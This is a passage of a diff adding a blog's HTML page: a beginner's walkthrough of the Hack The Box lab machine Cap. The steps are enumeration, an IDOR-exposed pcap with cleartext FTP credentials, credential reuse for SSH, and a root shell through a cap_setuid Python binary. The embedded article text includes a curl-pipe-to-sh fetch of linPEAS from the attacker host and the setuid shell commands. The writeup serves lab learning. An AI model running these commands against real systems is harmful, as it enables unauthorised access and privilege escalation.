@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HTB: Cap | d3vilsec</title>
+<meta name="keywords" content="htb, writeup, linux, ftp, wireshark, privilege-escalation, linux-capabilities">
+<meta name="description" content="Walkthrough of the Hack The Box machine Cap — an IDOR-style pcap leak gives up FTP creds, and a Linux capability on python3.8 hands over root.">
+<meta name="author" content="d3vilsec">
+<link rel="canonical" href="https://d3vilsec.com/blog/htb-cap/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.c711a8861c4337e70a4c623a70cf5d4f11f07a33d480982340205d8a3a7688ef.css" integrity="sha256-xxGohhxDN&#43;cKTGI6cM9dTxHwejPUgJgjQCBdijp2iO8=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://d3vilsec.com/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://d3vilsec.com/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://d3vilsec.com/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://d3vilsec.com/apple-touch-icon.png">
+<link rel="mask-icon" href="https://d3vilsec.com/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://d3vilsec.com/blog/htb-cap/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://d3vilsec.com/blog/htb-cap/">
+  <meta property="og:site_name" content="d3vilsec">
+  <meta property="og:title" content="HTB: Cap">
+  <meta property="og:description" content="Walkthrough of the Hack The Box machine Cap — an IDOR-style pcap leak gives up FTP creds, and a Linux capability on python3.8 hands over root.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2026-06-07T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-07T00:00:00+00:00">
+    <meta property="article:tag" content="Htb">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Ftp">
+    <meta property="article:tag" content="Wireshark">
+    <meta property="article:tag" content="Privilege-Escalation">
+    <meta property="og:image" content="https://d3vilsec.com/blog/htb-cap/01-security-dashboard.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://d3vilsec.com/blog/htb-cap/01-security-dashboard.png">
+  <meta name="twitter:title" content="HTB: Cap">
+  <meta name="twitter:description" content="Walkthrough of the Hack The Box machine Cap — an IDOR-style pcap leak gives up FTP creds, and a Linux capability on python3.8 hands over root.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Blog",
+      "item": "https://d3vilsec.com/blog/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HTB: Cap",
+      "item": "https://d3vilsec.com/blog/htb-cap/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Cap",
+  "name": "HTB: Cap",
+  "description": "Walkthrough of the Hack The Box machine Cap — an IDOR-style pcap leak gives up FTP creds, and a Linux capability on python3.8 hands over root.",
+  "keywords": [
+    "htb", "writeup", "linux", "ftp", "wireshark", "privilege-escalation", "linux-capabilities"
+  ],
+  "articleBody": "Difficulty: Easy · OS: Linux\nIntro This is the first real Hack The Box machine I’ve worked through start to finish. I’ve got some experience under my belt, but I’m still a little fledgling at this — so this is as much a record of how I think through a box as it is a writeup. Cap is rated Easy, and it turned out to be a great one to cut my teeth on: a little web enumeration, a packet capture to dig through, and a privesc that taught me something new. Here’s how it went.\nRecon Ran an initial nmap scan to see what I’m working with.\n└─$ nmap 10.129.11.152 -sV -sC Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 15:11 -0700 Nmap scan report for 10.129.11.152 Host is up (0.091s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http Gunicorn |_http-title: Security Dashboard |_http-server-header: gunicorn Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Three services: FTP (21), SSH (22), and an HTTP dashboard on 80 served by Gunicorn.\nTried an anonymous FTP login. No dice.\n┌──(d3vilsec㉿kali)-[~] └─$ ftp 10.129.11.152 21 Connected to 10.129.11.152. 220 (vsFTPd 3.0.3) Name (10.129.11.152:d3vilsec): anonymous 331 Please specify the password. Password: 530 Login incorrect. ftp: Login failed Enumerating the web app Port 80 is open, so I attempted to browse to the site.\nA couple of pages I can access. Nothing really noteworthy in my opinion.\nTried using ffuf to search for web directories.\n┌──(d3vilsec㉿kali)-[~] └─$ ffuf -u http://10.129.11.152/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.129.11.152/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ data [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 94ms] ip [Status: 200, Size: 17461, Words: 7275, Lines: 355, Duration: 109ms] netstat [Status: 200, Size: 32633, Words: 15705, Lines: 488, Duration: 101ms] :: Progress: [4750/4750] :: Job [1/1] :: 428 req/sec :: Duration: [0:00:11] :: Errors: 0 :: Nothing jumped out at first, but messing around with the URL I found a packet capture that could be interesting. The /data/ endpoint hands back whatever capture matches the ID — bump the number and you can read other captures (a classic IDOR).\nSniffing creds out of the pcap Opened the pcap file in Wireshark and found a cleartext login for FTP.\nSuccessful login!\n┌──(d3vilsec㉿kali)-[~] └─$ ftp 10.129.11.152 21 Connected to 10.129.11.152. 220 (vsFTPd 3.0.3) Name (10.129.11.152:d3vilsec): nathan 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e There was a user.txt file and I pulled it down.\nftp\u003e ls 229 Entering Extended Passive Mode (|||60055|) 150 Here comes the directory listing. -r-------- 1 1001 1001 33 Jun 07 22:10 user.txt 226 Directory send OK. ftp\u003e get user.txt local: user.txt remote: user.txt 229 Entering Extended Passive Mode (|||35293|) 150 Opening BINARY mode data connection for user.txt (33 bytes). 100% |****************************************| 33 619.74 KiB/s 00:00 ETA 226 Transfer complete. 33 bytes received in 00:00 (0.35 KiB/s) ftp\u003e Found the user flag. One down, one to go.\n┌──(d3vilsec㉿kali)-[~] └─$ cat user.txt [REDACTED] Getting a shell Let’s see if I can SSH with the same credentials.\n┌──(d3vilsec㉿kali)-[~] └─$ ssh nathan@10.129.11.152 The authenticity of host '10.129.11.152 (10.129.11.152)' can't be established. ED25519 key fingerprint is: SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.129.11.152' (ED25519) to the list of known hosts. nathan@10.129.11.152's password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) ... Last login: Thu May 27 11:21:27 2021 from 10.10.14.7 nathan@cap:~$ Reused FTP creds work for SSH. Tried to escalate with sudo, but no luck.\nnathan@cap:~$ sudo -i [sudo] password for nathan: nathan is not in the sudoers file. This incident will be reported. Took a look at nathan’s home dir. Typical stuff, but I still read through it. .bash_logout made me curious and pointed me toward /usr/bin.\nnathan@cap:~$ ls -la total 28 drwxr-xr-x 3 nathan nathan 4096 May 27 2021 . drwxr-xr-x 3 root root 4096 May 23 2021 .. lrwxrwxrwx 1 root root 9 May 15 2021 .bash_history -\u003e /dev/null -rw-r--r-- 1 nathan nathan 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 nathan nathan 3771 Feb 25 2020 .bashrc drwx------ 2 nathan nathan 4096 May 23 2021 .cache -rw-r--r-- 1 nathan nathan 807 Feb 25 2020 .profile lrwxrwxrwx 1 root root 9 May 27 2021 .viminfo -\u003e /dev/null -r-------- 1 nathan nathan 33 Jun 7 22:10 user.txt Privilege escalation — Linux capabilities This is where I got stuck and used the hint: \"linPEAS will show this in the ‘Files with capabilities’ section of the output. Or use the getcap binary on Cap.\"\nI set up a temporary HTTP server on my box so I could pull linpeas down to the victim and run it.\nOn my machine:\n┌──(d3vilsec㉿kali)-[/usr/share/peass/linpeas] └─$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.129.11.152 - - [07/Jun/2026 16:19:06] \"GET /linpeas.sh HTTP/1.1\" 200 - On the victim:\nnathan@cap:~$ curl 10.10.14.35/linpeas.sh | sh ... Files with capabilities (limited to 50): /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep There it is: /usr/bin/python3.8 carries cap_setuid. That capability lets the binary set its UID to anything it wants — including 0 — without needing sudo. I got stuck on the exact syntax here (Python isn’t my strong suit), but the path was right. Calling os.setuid(0) to become root, then spawning a shell:\nnathan@cap:~$ /usr/bin/python3.8 Python 3.8.5 (default, Jan 27 2021, 15:41:15) [GCC 9.3.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. \u003e\u003e\u003e import os \u003e\u003e\u003e os.setuid(0) \u003e\u003e\u003e os.system(\"/bin/bash\") root@cap:~# Root. Grabbed the final flag.\nroot@cap:~# cat /root/root.txt [REDACTED] Takeaways The /data/ endpoint is a textbook IDOR — sequential IDs let you read captures that aren’t yours, and one of them leaked cleartext FTP creds. Credential reuse between FTP and SSH turned a single leak into an interactive shell. The root cause of the privesc is a dangerous Linux capability (cap_setuid) on the Python binary. getcap -r / 2\u003e/dev/null is worth running on every Linux box — capabilities don’t show up in a sudo -l and are easy to miss. Conclusion For my first real box, Cap taught me a lot. A couple of things were brand new to me: getting linPEAS onto the target and reading its output is a workflow I’ll reach for on every Linux box from here on out, and the privesc was my first time using Python’s os module (os.setuid / os.system) to abuse a capability and land a root shell.\nThe honest takeaway is that I need to get stronger with Python. I got stuck on the exact syntax at the final step and had to lean on a hint to push through. Reading and writing Python well is clearly going to pay off across a lot of these challenges, so that’s where I’m pointing my study next. On to the next one.\n",
+  "wordCount" : "1251",
+  "inLanguage": "en",
+  "image":"https://d3vilsec.com/blog/htb-cap/01-security-dashboard.png","datePublished": "2026-06-07T00:00:00Z",
+  "dateModified": "2026-06-07T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "d3vilsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://d3vilsec.com/blog/htb-cap/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "d3vilsec",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://d3vilsec.com/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="https://d3vilsec.com/" accesskey="h" title="d3vilsec (Alt + H)">d3vilsec</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="https://d3vilsec.com/blog/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d3vilsec.com/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d3vilsec.com/cheatsheets/" title="Cheatsheets">
+                    <span>Cheatsheets</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d3vilsec.com/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d3vilsec.com/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/blog/">Blog</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+    <h1 class="post-title entry-hint-parent">
+      HTB: Cap
+    </h1>
+    <div class="post-description">
+      Walkthrough of the Hack The Box machine Cap — an IDOR-style pcap leak gives up FTP creds, and a Linux capability on python3.8 hands over root.
+    </div>
+    <div class="post-meta">
+
+<span title='2026-06-07 00:00:00 +0000 UTC'>June 7, 2026</span>&nbsp;·&nbsp;<span>6 min</span>&nbsp;·&nbsp;<span>d3vilsec</span>
+
+</div>
+  </header> 
+<figure class="entry-cover">
+            <img loading="eager"
+                srcset='https://d3vilsec.com/blog/htb-cap/01-security-dashboard_hu_d25b47f659d138fc.png 360w,https://d3vilsec.com/blog/htb-cap/01-security-dashboard_hu_f0a73f7c3df952ea.png 480w,https://d3vilsec.com/blog/htb-cap/01-security-dashboard_hu_5e4231ea23e5c3f7.png 720w,https://d3vilsec.com/blog/htb-cap/01-security-dashboard_hu_514b54cb569802b2.png 1080w,https://d3vilsec.com/blog/htb-cap/01-security-dashboard.png 1272w'
+                src="https://d3vilsec.com/blog/htb-cap/01-security-dashboard.png"
+                sizes="(min-width: 768px) 720px, 100vw"
+                width="1272" height="1398"
+                alt="Cap Security Dashboard landing page">
+        
+</figure><details class="toc" >
+    <summary accesskey="c" title="(Alt + C)">
+        <span class="title">Table of Contents</span>
+    </summary>
+
+    <div class="inner"><ul>
+            <li>
+                <a href="#intro" aria-label="Intro">Intro</a></li>
+            <li>
+                <a href="#recon" aria-label="Recon">Recon</a></li>
+            <li>
+                <a href="#enumerating-the-web-app" aria-label="Enumerating the web app">Enumerating the web app</a></li>
+            <li>
+                <a href="#sniffing-creds-out-of-the-pcap" aria-label="Sniffing creds out of the pcap">Sniffing creds out of the pcap</a></li>
+            <li>
+                <a href="#getting-a-shell" aria-label="Getting a shell">Getting a shell</a></li>
+            <li>
+                <a href="#privilege-escalation--linux-capabilities" aria-label="Privilege escalation — Linux capabilities">Privilege escalation — Linux capabilities</a></li>
+            <li>
+                <a href="#takeaways" aria-label="Takeaways">Takeaways</a></li>
+            <li>
+                <a href="#conclusion" aria-label="Conclusion">Conclusion</a>
+            </li>
+        </ul>
+    </div>
+</details>
+
+  <div class="post-content md-content"><p><strong>Difficulty:</strong> Easy · <strong>OS:</strong> Linux</p>
+<h2 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h2>
+<p>This is the first real Hack The Box machine I&rsquo;ve worked through start to finish. I&rsquo;ve got some experience under my belt, but I&rsquo;m still a little fledgling at this — so this is as much a record of how I think through a box as it is a writeup. Cap is rated Easy, and it turned out to be a great one to cut my teeth on: a little web enumeration, a packet capture to dig through, and a privesc that taught me something new. Here&rsquo;s how it went.</p>
+<h2 id="recon">Recon<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h2>
+<p>Ran an initial nmap scan to see what I&rsquo;m working with.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>└─$ nmap 10.129.11.152 -sV -sC
+</span></span><span style="display:flex;"><span>Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 15:11 -0700
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.129.11.152
+</span></span><span style="display:flex;"><span>Host is up (0.091s latency).
+</span></span><span style="display:flex;"><span>Not shown: 997 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+</span></span><span style="display:flex;"><span>|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp open  http    Gunicorn
+</span></span><span style="display:flex;"><span>|_http-title: Security Dashboard
+</span></span><span style="display:flex;"><span>|_http-server-header: gunicorn
+</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Three services: FTP (21), SSH (22), and an HTTP dashboard on 80 served by Gunicorn.</p>
+<p>Tried an anonymous FTP login. No dice.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ ftp 10.129.11.152 21
+</span></span><span style="display:flex;"><span>Connected to 10.129.11.152.
+</span></span><span style="display:flex;"><span>220 (vsFTPd 3.0.3)
+</span></span><span style="display:flex;"><span>Name (10.129.11.152:d3vilsec): anonymous
+</span></span><span style="display:flex;"><span>331 Please specify the password.
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span>530 Login incorrect.
+</span></span><span style="display:flex;"><span>ftp: Login failed
+</span></span></code></pre></div><h2 id="enumerating-the-web-app">Enumerating the web app<a hidden class="anchor" aria-hidden="true" href="#enumerating-the-web-app">#</a></h2>
+<p>Port 80 is open, so I attempted to browse to the site.</p>
+<p><img alt="Security Dashboard landing page" loading="lazy" src="/blog/htb-cap/01-security-dashboard.png"></p>
+<p>A couple of pages I can access. Nothing really noteworthy in my opinion.</p>
+<p><img alt="Dashboard page" loading="lazy" src="/blog/htb-cap/02-dashboard-page.png">
+<img alt="Dashboard page" loading="lazy" src="/blog/htb-cap/03-dashboard-page.png">
+<img alt="Dashboard page" loading="lazy" src="/blog/htb-cap/04-dashboard-page.png"></p>
+<p>Tried using <code>ffuf</code> to search for web directories.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ ffuf -u http://10.129.11.152/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /&#39;___\  /&#39;___\           /&#39;___\
+</span></span><span style="display:flex;"><span>       /\ \__/ /\ \__/  __  __  /\ \__/
+</span></span><span style="display:flex;"><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+</span></span><span style="display:flex;"><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+</span></span><span style="display:flex;"><span>         \ \_\   \ \_\  \ \____/  \ \_\
+</span></span><span style="display:flex;"><span>          \/_/    \/_/   \/___/    \/_/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://10.129.11.152/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : 10
+</span></span><span style="display:flex;"><span> :: Threads          : 40
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data                    [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 94ms]
+</span></span><span style="display:flex;"><span>ip                      [Status: 200, Size: 17461, Words: 7275, Lines: 355, Duration: 109ms]
+</span></span><span style="display:flex;"><span>netstat                 [Status: 200, Size: 32633, Words: 15705, Lines: 488, Duration: 101ms]
+</span></span><span style="display:flex;"><span>:: Progress: [4750/4750] :: Job [1/1] :: 428 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
+</span></span></code></pre></div><p>Nothing jumped out at first, but messing around with the URL I found a packet capture that could be interesting. The <code>/data/&lt;id&gt;</code> endpoint hands back whatever capture matches the ID — bump the number and you can read other captures (a classic IDOR).</p>
+<p><img alt="pcap download from the /data endpoint" loading="lazy" src="/blog/htb-cap/05-pcap-scan.png"></p>
+<h2 id="sniffing-creds-out-of-the-pcap">Sniffing creds out of the pcap<a hidden class="anchor" aria-hidden="true" href="#sniffing-creds-out-of-the-pcap">#</a></h2>
+<p>Opened the pcap file in Wireshark and found a cleartext login for FTP.</p>
+<p><img alt="FTP credentials in Wireshark" loading="lazy" src="/blog/htb-cap/06-wireshark-ftp-creds.png"></p>
+<p>Successful login!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ ftp 10.129.11.152 21
+</span></span><span style="display:flex;"><span>Connected to 10.129.11.152.
+</span></span><span style="display:flex;"><span>220 (vsFTPd 3.0.3)
+</span></span><span style="display:flex;"><span>Name (10.129.11.152:d3vilsec): nathan
+</span></span><span style="display:flex;"><span>331 Please specify the password.
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span>230 Login successful.
+</span></span><span style="display:flex;"><span>Remote system type is UNIX.
+</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
+</span></span><span style="display:flex;"><span>ftp&gt;
+</span></span></code></pre></div><p>There was a <code>user.txt</code> file and I pulled it down.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span>229 Entering Extended Passive Mode (|||60055|)
+</span></span><span style="display:flex;"><span>150 Here comes the directory listing.
+</span></span><span style="display:flex;"><span>-r--------    1 1001     1001           33 Jun 07 22:10 user.txt
+</span></span><span style="display:flex;"><span>226 Directory send OK.
+</span></span><span style="display:flex;"><span>ftp&gt; get user.txt
+</span></span><span style="display:flex;"><span>local: user.txt remote: user.txt
+</span></span><span style="display:flex;"><span>229 Entering Extended Passive Mode (|||35293|)
+</span></span><span style="display:flex;"><span>150 Opening BINARY mode data connection for user.txt (33 bytes).
+</span></span><span style="display:flex;"><span>100% |****************************************|    33      619.74 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span><span style="display:flex;"><span>33 bytes received in 00:00 (0.35 KiB/s)
+</span></span><span style="display:flex;"><span>ftp&gt;
+</span></span></code></pre></div><p>Found the user flag. One down, one to go.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ cat user.txt
+</span></span><span style="display:flex;"><span>[REDACTED]
+</span></span></code></pre></div><h2 id="getting-a-shell">Getting a shell<a hidden class="anchor" aria-hidden="true" href="#getting-a-shell">#</a></h2>
+<p>Let&rsquo;s see if I can SSH with the same credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ ssh nathan@10.129.11.152
+</span></span><span style="display:flex;"><span>The authenticity of host &#39;10.129.11.152 (10.129.11.152)&#39; can&#39;t be established.
+</span></span><span style="display:flex;"><span>ED25519 key fingerprint is: SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI
+</span></span><span style="display:flex;"><span>This key is not known by any other names.
+</span></span><span style="display:flex;"><span>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span style="display:flex;"><span>Warning: Permanently added &#39;10.129.11.152&#39; (ED25519) to the list of known hosts.
+</span></span><span style="display:flex;"><span>nathan@10.129.11.152&#39;s password:
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
+</span></span><span style="display:flex;"><span>nathan@cap:~$
+</span></span></code></pre></div><p>Reused FTP creds work for SSH. Tried to escalate with <code>sudo</code>, but no luck.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>nathan@cap:~$ sudo -i
+</span></span><span style="display:flex;"><span>[sudo] password for nathan:
+</span></span><span style="display:flex;"><span>nathan is not in the sudoers file.  This incident will be reported.
+</span></span></code></pre></div><p>Took a look at nathan&rsquo;s home dir. Typical stuff, but I still read through it. <code>.bash_logout</code> made me curious and pointed me toward <code>/usr/bin</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>nathan@cap:~$ ls -la
+</span></span><span style="display:flex;"><span>total 28
+</span></span><span style="display:flex;"><span>drwxr-xr-x 3 nathan nathan 4096 May 27  2021 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x 3 root   root   4096 May 23  2021 ..
